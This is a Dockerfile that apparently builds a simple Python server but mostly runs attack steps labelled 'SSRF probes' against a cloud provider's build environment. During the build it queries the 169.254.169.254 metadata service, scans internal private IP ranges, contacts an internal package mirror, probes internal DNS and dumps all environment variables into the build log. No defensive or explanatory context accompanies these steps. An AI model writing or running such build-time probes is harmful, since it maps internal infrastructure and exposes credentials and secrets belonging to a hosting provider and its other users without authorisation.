FROM alpine:3.19

RUN apk add --no-cache curl python3

# SSRF probe 1: DO Metadata Service from build environment
RUN echo "=== METADATA PROBE ===" && \
    curl -s --max-time 5 http://169.254.169.254/metadata/v1/ 2>&1 || \
    curl -s --max-time 5 http://169.254.169.254/ 2>&1 || \
    echo "METADATA_BLOCKED"

# SSRF probe 2: Internal build network (common DO build ranges)
RUN echo "=== INTERNAL NETWORK SCAN ===" && \
    for ip in 10.0.0.1 10.10.0.1 10.32.0.1 10.244.0.1 172.17.0.1 172.16.0.1; do \
      result=$(curl -s --max-time 2 http://$ip/ 2>&1 | head -c 200); \
      echo "IP $ip: $result"; \
    done

# SSRF probe 3: DO internal package mirror (repos-droplet.digitalocean.com)
RUN echo "=== PACKAGE MIRROR ===" && \
    curl -sv --max-time 5 http://repos-droplet.digitalocean.com/ 2>&1 | head -50 || true

# SSRF probe 4: Internal DNS resolve
RUN echo "=== DNS PROBE ===" && \
    cat /etc/resolv.conf && \
    nslookup metadata.internal 2>&1 || \
    nslookup internal.digitalocean.com 2>&1 || true

# SSRF probe 5: Environment variables during build
RUN echo "=== BUILD ENV ===" && env | sort

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

